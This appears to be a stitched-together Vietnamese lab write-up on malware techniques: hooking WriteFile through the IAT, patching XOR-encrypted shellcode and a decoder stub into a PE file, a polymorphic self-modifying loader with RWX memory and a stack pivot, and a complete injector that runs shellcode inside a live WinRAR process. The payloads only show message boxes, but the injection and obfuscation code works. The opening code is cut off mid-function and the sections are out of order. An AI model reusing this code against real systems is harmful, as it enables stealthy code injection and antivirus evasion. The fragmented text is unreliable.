```c++
#include <windows.h>

// Định nghĩa con trỏ hàm theo chuẩn gọi __stdcall của WriteFile
typedef BOOL(WINAPI* pfnWriteFile)(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
    );

// Biến toàn cục lưu địa chỉ WriteFile gốc
pfnWriteFile g_OriginalWriteFile = NULL;

BOOL WINAPI HookedWriteFile(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
) {
    if (lpBuffer != NULL && nNumberOfBytesToWrite > 0) {
        char* tempLog = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nNumberOfBytesToWrite + 1);
        if (tempLog != NULL) {
            memcpy(tempLog, lpBuffer, nNumberOfBytesToWrite);
            tempLog[nNumberOfBytesToWrite] = '\0';

            MessageBoxA(NULL, tempLog, "WriteFile Intercepted (ANSI)", MB_OK | MB_ICONINFORMATION);

            HeapFree(GetProcessHeap(), 0, tempLog);
        }
    }

    if (g_OriginalWriteFile != NULL) {
        return g_OriginalWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }

    return FALSE;

// 2. Hàm tráo con trỏ trong bảng IAT
void SetIATHook() {
```

![image-13](https://hackmd.io/_uploads/HkazdtgjGe.png)

- Vì shellcode đang bị mã hóa, chương trình không thể chạy trực tiếp vùng nhớ này. Ta cần thêm một decoder stub nhỏ để giải mã shellcode trong bộ nhớ trước khi thực thi.

- Shellcode mã hóa dài `0x3A` byte, nên decoder stub sẽ được đặt ngay phía sau:

```text
Raw offset decoder stub = 0x7B48 + 0x3A = 0x7B82
VA decoder stub         = 0x01008748 + 0x3A = 0x01008782
```

- Decoder stub được dùng:

```asm
mov ecx, 0x3A
mov esi, 0x01008748
mov al, 0x62
xor al, 0x37
xor byte ptr [esi], al
inc esi
loop ...
jmp 0x01008748
```

> Ở đây khóa XOR thật là `0x55`, nhưng không lưu trực tiếp dưới dạng hằng số. Thay vào đó chương trình tạo khóa bằng phép `0x62 ^ 0x37 = 0x55`.

- Byte tương ứng của decoder stub:

```text
B9 3A 00 00 00 BE 48 87 00 01 B0 62 34 37 30 06 46 E2 FB E9 AE FF FF FF
```

- Trong HxD, đi tới offset `0x7B82`, dán decoder stub trên vào ngay sau shellcode đã mã hóa.

![image-14](https://hackmd.io/_uploads/B1BXdKesGx.png)

- Lưu ý: decoder stub sẽ ghi trực tiếp vào vùng chứa shellcode để giải mã:


# Bài thực hành 11: Mã tự thay đổi (Self-Modifying Code)


**Luồng hoạt động:**
- C Loader khởi chạy → sinh khóa XOR ngẫu nhiên (`srand`/`rand`)
- Mã hóa payload gốc bằng XOR, ghi vào `encoded_body`
- Gọi `mprotect()` cấp quyền RWX cho vùng nhớ chứa payload
- Gọi hàm Assembly → decoder stub chạy vòng lặp XOR, khôi phục opcode gốc `48 89 DC 5B C3` (`mov rsp, rbx | pop rbx | ret`)
- Stack pivot + `ret` → CPU nhảy vào thực thi opcode vừa giải mã, thoát an toàn

Mỗi lần chạy, C Loader gọi `rand()` sinh khóa XOR 1 byte khác nhau rồi XOR vào payload gốc, nên encoded payload trên bộ nhớ đổi liên tục qua mỗi lần chạy — nhưng decoder stub luôn giải mã đúng về `48 89 DC 5B C3`. Đoạn decoder viết bằng Assembly:

```asm
    lea rsi, [rel encoded_body]  ; địa chỉ payload (RIP-relative)
    mov ecx, 5                   ; số byte cần giải mã
    mov al, [rel decode_key]     ; khóa XOR động

.decode_loop:
    xor byte [rsi], al
    inc rsi
    loop .decode_loop
```

- `[rel ...]`: địa chỉ tương đối RIP, không phụ thuộc địa chỉ nạp cụ thể.
- `xor byte [rsi], al` chạy được vì vùng nhớ đã được cấp quyền Write từ trước.
- `loop` dùng `ECX` làm bộ đếm, tự giảm và kiểm tra điều kiện mỗi vòng.

Mặc định `.data` chỉ có quyền RW, không có Execute — CPU nhảy vào chạy trực tiếp sẽ bị Segmentation fault. Nên trước khi giải mã, C Loader gọi `mprotect()`:

```c
size_t pagesize = sysconf(_SC_PAGE_SIZE);
uintptr_t page_start = (uintptr_t)&decode_key & ~(pagesize - 1);
mprotect((void*)page_start, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC);
```

- `PROT_WRITE` → cho decoder ghi đè opcode.
- `PROT_EXEC` → cho CPU thực thi sau khi giải mã xong.
- Lời gọi `mprotect`/`VirtualProtect` xin RWX cho vùng dữ liệu là hành vi bất thường, hay bị EDR/AV để ý.

Sau vòng lặp giải mã, chương trình **chưa thực thi ngay tại chỗ**, mà làm thêm 2 bước:

```asm
    ; Stack pivot
    lea rax, [rel fake_stack_top]
    mov rsp, rax

    ; Return-to-shellcode
    lea rax, [rel encoded_body]
    push rax
    ret
```

- **Pivot:** chuyển `rsp` sang vùng `.bss` riêng (`fake_stack_top`), không dùng stack gốc nữa — đáp ứng đúng yêu cầu không `jmp`/`call` trực tiếp.
- **Return-to-shellcode:** đẩy địa chỉ `encoded_body` lên stack giả rồi `ret` → CPU nhảy vào chạy đúng đoạn vừa giải mã. Kỹ thuật kiểu ROP.
- CPU sau đó chạy 5 byte vừa giải mã: `mov rsp, rbx` (khôi phục stack gốc, đã lưu vào `rbx` từ đầu hàm) → `pop rbx` (khôi phục `rbx` gốc) → `ret` (quay về `main()` trong C an toàn, không crash).
- Payload này chỉ dọn dẹp trạng thái CPU, không có hành vi gây hại — mục đích là chứng minh cơ chế self-modify + pivot + ret, không phải chạy mã độc thật.

File `demo.c`
```
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <time.h>
#include <stdlib.h>

extern void true_self_modifying(void);
extern unsigned char encoded_body[];
extern unsigned char encoded_body_end[];
extern unsigned char decode_key; // Liên kết với biến khóa trong ASM

static void print_bytes(const char *title, const unsigned char *buf, size_t n) {
    printf("%s", title);
    for (size_t i = 0; i < n; ++i) printf("%02X ", buf[i]);
    putchar('\n');
}

int main(void) {
    // Khởi tạo engine sinh số ngẫu nhiên
    srand(time(NULL));
    // Random khóa XOR từ 1 đến 255
    unsigned char random_key = rand() % 255 + 1; 

    // Opcode gốc: mov rsp, rbx (48 89 DC) | pop rbx (5B) | ret (C3)
    unsigned char original_payload[5] = {0x48, 0x89, 0xDC, 0x5B, 0xC3};

    printf("==================================================\n");
    printf(" TASK 11 - TRUE POLYMORPHIC MUTATION ENGINE DEMO\n");
    printf("==================================================\n\n");

    printf("[*] Mutation Engine Generating New Signature...\n");
    printf("[*] Selected Random XOR Key: 0x%02X\n\n", random_key);

    // GHI ĐÈ KHÓA VÀ PAYLOAD ĐÃ MÃ HÓA VÀO BỘ NHỚ ASM
    decode_key = random_key;
    for (int i = 0; i < 5; i++) {
        encoded_body[i] = original_payload[i] ^ random_key;
    }

    print_bytes("ENCODED PAYLOAD BEFORE : ", encoded_body, 5);

    // Cấp quyền RWX cho vùng nhớ chứa code và biến
    size_t pagesize = sysconf(_SC_PAGE_SIZE);
    uintptr_t page_start = (uintptr_t)&decode_key & ~(pagesize - 1);
    
    if (mprotect((void*)page_start, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect failed");
        return 1;
    }
    printf("[+] Memory protection changed to RWX (Read/Write/Execute) successfully.\n\n");

    printf("Executing true_self_modifying()...\n");
    
    // Kích hoạt ASM giải mã bằng khóa động và bẻ lái Stack Pivot
    true_self_modifying();
    
    printf("CPU executed the decoded payload successfully!\n");
    print_bytes("DECODED PAYLOAD AFTER  : ", encoded_body, 5);
    printf("-> (48 89 DC = mov rsp, rbx | 5B = pop rbx | C3 = ret)\n");

    return 0;
}
```

File `payload.asm`
```

global true_self_modifying
global encoded_body
global encoded_body_end
global decode_key           ; Cho phép C can thiệp vào khóa giải mã

section .text

true_self_modifying:
    ; 1. LƯU STACK GỐC
    push rbx                
    mov rbx, rsp            

    ; 2. DECODER STUB: Giải mã với khóa động
    lea rsi, [rel encoded_body]
    mov rcx, encoded_body_end - encoded_body
    mov al, [rel decode_key]  ; Lấy khóa ngẫu nhiên do C tạo ra nạp vào AL

.decode_loop:
    xor byte [rsi], al        ; XOR với khóa ngẫu nhiên trong AL
    inc rsi
    loop .decode_loop

    ; 3. TRUE STACK PIVOT
    lea rax, [rel fake_stack_top]
    mov rsp, rax            

    ; 4. ROP CONTROL TRANSFER
    lea rax, [rel encoded_body]
    push rax
    ret                     

section .bss
    align 16
    resq 16                 
    fake_stack_top:

section .data
    align 16
decode_key:
    db 0xAA                 ; Khóa mặc định (sẽ bị Động cơ C ghi đè)
encoded_body:
    ; Chỗ trống 5 bytes. C sẽ tự động mã hóa và bơm payload vào đây mỗi lần chạy
    db 0x00, 0x00, 0x00, 0x00, 0x00  
encoded_body_end:
```

## Bài 12: Shellcode Injection vào ứng dụng hợp pháp WinRAR

- Ở bài này, thay vì sửa trực tiếp file PE như các bài trước, ta viết một chương trình riêng là `Injector.exe` để inject shellcode vào tiến trình `WinRAR.exe` đang chạy.

> Toàn bộ thao tác được thực hiện trong máy ảo Windows và chạy bằng quyền user thường, không chọn `Run as administrator`.

- Luồng thực hiện chính:

```text
Injector.exe
    -> quét tiến trình đang chạy
    -> tìm WinRAR.exe
    -> lấy PID của WinRAR
    -> mở handle tới tiến trình WinRAR
    -> tạo chuỗi thời gian hiện tại
    -> cấp phát vùng nhớ trong WinRAR cho text, title và shellcode
    -> ghi dữ liệu + shellcode vào bộ nhớ WinRAR
    -> đổi quyền vùng shellcode sang Execute/Read
    -> tạo remote thread để WinRAR tự chạy shellcode
    -> shellcode gọi MessageBoxW và hiển thị thời gian hiện tại
```

- Code của `Injector.cpp`:

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <cstdint>

// ---------- Tìm PID theo tên tiến trình ----------
DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// ---------- Lấy chuỗi thời gian hiện tại ----------
std::wstring GetCurrentTimeText() {
    SYSTEMTIME st{};
    GetLocalTime(&st);

    int hour12 = st.wHour % 12;
    if (hour12 == 0) hour12 = 12;

    wchar_t buffer[128]{};
    swprintf_s(
        buffer,
        L"%02d:%02d%s %02d/%02d/%04d",
        hour12,
        st.wMinute,
        st.wHour >= 12 ? L"pm" : L"am",
        st.wDay,
        st.wMonth,
        st.wYear
    );

    return buffer;
}

// ---------- Build shellcode gọi MessageBoxW(NULL, text, title, MB_OK) ----------
// x64 calling convention: RCX, RDX, R8, R9
std::vector<BYTE> BuildMessageBoxShellcode(
    uint64_t msgBoxAddr,
    uint64_t textAddr,
    uint64_t titleAddr
) {
    std::vector<BYTE> sc;

    // sub rsp, 0x28: chừa shadow space và giữ stack alignment
    sc.insert(sc.end(), { 0x48, 0x83, 0xEC, 0x28 });

    // xor rcx, rcx: hWnd = NULL
    sc.insert(sc.end(), { 0x48, 0x31, 0xC9 });

    // mov rdx, textAddr: lpText = địa chỉ chuỗi thời gian trong WinRAR
    sc.push_back(0x48);
    sc.push_back(0xBA);
    for (int i = 0; i < 8; i++) {
        sc.push_back((textAddr >> (i * 8)) & 0xFF);
    }

    // mov r8, titleAddr: lpCaption = địa chỉ title trong WinRAR
    sc.push_back(0x49);
    sc.push_back(0xB8);
    for (int i = 0; i < 8; i++) {
        sc.push_back((titleAddr >> (i * 8)) & 0xFF);
    }

    // xor r9d, r9d: uType = MB_OK
    sc.insert(sc.end(), { 0x45, 0x31, 0xC9 });

    // mov rax, msgBoxAddr: địa chỉ MessageBoxW
    sc.push_back(0x48);
    sc.push_back(0xB8);
    for (int i = 0; i < 8; i++) {
        sc.push_back((msgBoxAddr >> (i * 8)) & 0xFF);
    }

    // call rax: gọi MessageBoxW
    sc.insert(sc.end(), { 0xFF, 0xD0 });

    // add rsp, 0x28: khôi phục stack
    sc.insert(sc.end(), { 0x48, 0x83, 0xC4, 0x28 });

    // ret: kết thúc shellcode
    sc.push_back(0xC3);

    return sc;
}

int wmain() {
    std::wcout << L"[*] Bat dau chuong trinh Injector...\n";
    std::wcout << L"[*] Dang tim tien trinh WinRAR.exe...\n";

    // Chờ đến khi thấy WinRAR.exe đang chạy
    DWORD pid = 0;
    while (pid == 0) {
        pid = GetProcessIdByName(L"WinRAR.exe");
        if (pid == 0) {
            std::wcout << L"[-] Chua thay WinRAR.exe, dang cho...\n";
            Sleep(1000);
        }
    }

    std::wcout << L"[+] Da tim thay WinRAR.exe voi PID: " << pid << L"\n";

    // Mở tiến trình với các quyền vừa đủ để ghi bộ nhớ và tạo remote thread
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        std::wcerr << L"[-] OpenProcess that bai. Error = " << GetLastError() << L"\n";
        return 1;
    }

    std::wcout << L"[+] Mo handle toi WinRAR thanh cong bang quyen user thuong.\n";

    // Tạo nội dung thời gian và title sẽ được hiển thị trong MessageBox
    std::wstring timeText = GetCurrentTimeText();
    std::wstring title = L"WinRAR Shellcode Lab";
    std::wcout << L"[+] Noi dung se hien thi: " << timeText << L"\n";

    SIZE_T textSize = (timeText.size() + 1) * sizeof(wchar_t);
    SIZE_T titleSize = (title.size() + 1) * sizeof(wchar_t);

    // Cấp phát vùng nhớ trong WinRAR cho text và title
    LPVOID pText = VirtualAllocEx(
        hProcess,
        NULL,
        textSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    LPVOID pTitle = VirtualAllocEx(
        hProcess,
        NULL,
        titleSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pText || !pTitle) {
        std::wcerr << L"[-] VirtualAllocEx cho text/title that bai.\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Ghi text và title vào bộ nhớ của WinRAR
    if (!WriteProcessMemory(hProcess, pText, timeText.c_str(), textSize, NULL) ||
        !WriteProcessMemory(hProcess, pTitle, title.c_str(), titleSize, NULL)) {
        std::wcerr << L"[-] WriteProcessMemory text/title that bai.\n";
        CloseHandle(hProcess);
        return 1;
    }

    std::wcout << L"[+] Da ghi chuoi text/title vao WinRAR.\n";

    // Lấy địa chỉ MessageBoxW từ user32.dll
    // Trong môi trường lab này, injector và WinRAR cùng session, cùng kiến trúc x64
    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
    if (!hUser32) hUser32 = LoadLibraryW(L"user32.dll");

    uint64_t msgBoxAddr = (uint64_t)GetProcAddress(hUser32, "MessageBoxW");
    if (!msgBoxAddr) {
        std::wcerr << L"[-] Khong resolve duoc MessageBoxW.\n";
        CloseHandle(hProcess);
        return 1;
    }

    std::wcout << L"[+] MessageBoxW @ 0x" << std::hex << msgBoxAddr << L"\n";

    // Build shellcode runtime với địa chỉ MessageBoxW, text và title đã chuẩn bị
    std::vector<BYTE> shellcode = BuildMessageBoxShellcode(
        msgBoxAddr,
        (uint64_t)pText,
        (uint64_t)pTitle
    );

    SIZE_T scSize = shellcode.size();
    std::wcout << L"[+] Shellcode size = " << std::dec << scSize << L" bytes.\n";

    // Cấp phát vùng nhớ cho shellcode với quyền Read/Write trước
    LPVOID pShell = VirtualAllocEx(
        hProcess,
        NULL,
        scSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!pShell) {
        std::wcerr << L"[-] VirtualAllocEx cho shellcode that bai.\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Ghi shellcode vào tiến trình WinRAR
    if (!WriteProcessMemory(hProcess, pShell, shellcode.data(), scSize, NULL)) {
        std::wcerr << L"[-] WriteProcessMemory shellcode that bai. Error = "
                   << GetLastError() << L"\n";
        CloseHandle(hProcess);
        return 1;
    }

    std::wcout << L"[+] Da ghi shellcode vao WinRAR @ 0x"
               << std::hex << pShell << L"\n";

    // Đổi quyền vùng shellcode sang Execute/Read trước khi chạy
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pShell, scSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::wcerr << L"[-] VirtualProtectEx that bai. Error = "
                   << GetLastError() << L"\n";
        CloseHandle(hProcess);
        return 1;
    }

    std::wcout << L"[+] VirtualProtectEx -> PAGE_EXECUTE_READ thanh cong.\n";

    // Tạo remote thread trong WinRAR để bắt đầu chạy shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pShell,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        std::wcerr << L"[-] CreateRemoteThread that bai. Error = "
                   << GetLastError() << L"\n";
        CloseHandle(hProcess);
        return 1;
    }

    std::wcout << L"[+] Da tao remote thread thanh cong. Shellcode dang chay...\n";

    WaitForSingleObject(hThread, INFINITE);

    // Dọn dẹp vùng nhớ và handle sau khi shellcode chạy xong
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pShell, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pText, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pTitle, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::wcout << L"[*] Hoan tat qua trinh Inject.\n";
    return 0;
}
```

- Các API chính được dùng trong injector:

```text
CreateToolhelp32Snapshot: tạo snapshot danh sách tiến trình
Process32FirstW/Process32NextW: duyệt tiến trình để tìm WinRAR.exe
OpenProcess: lấy handle tới tiến trình WinRAR
GetLocalTime: lấy thời gian hiện tại
VirtualAllocEx: cấp phát bộ nhớ trong tiến trình WinRAR
WriteProcessMemory: ghi text, title và shellcode vào WinRAR
GetModuleHandleW/LoadLibraryW: lấy module user32.dll trong injector
GetProcAddress: lấy địa chỉ MessageBoxW
VirtualProtectEx: đổi vùng shellcode sang PAGE_EXECUTE_READ
CreateRemoteThread: tạo thread mới để chạy shellcode trong WinRAR
WaitForSingleObject: chờ thread chạy xong
VirtualFreeEx: giải phóng vùng nhớ sau khi shellcode kết thúc
CloseHandle: đóng handle đã mở
```

- Hành vi quan sát được:
  - File `WinRAR.exe` trên ổ đĩa không bị chỉnh sửa.
  - Thay đổi chỉ xảy ra trong bộ nhớ của tiến trình WinRAR đang chạy.
  - Trong WinRAR xuất hiện vùng nhớ chứa `timeText`, `title` và shellcode.
  - Remote thread chạy shellcode và hiển thị MessageBox với thời gian hiện tại.
  - Khi đóng MessageBox, thread kết thúc và WinRAR vẫn tiếp tục chạy bình thường.

> Trong quá trình làm, nhóm không chỉnh sửa file thực thi của WinRAR. Bài này chỉ tập trung quan sát cơ chế inject shellcode vào tiến trình hợp pháp trong môi trường lab.
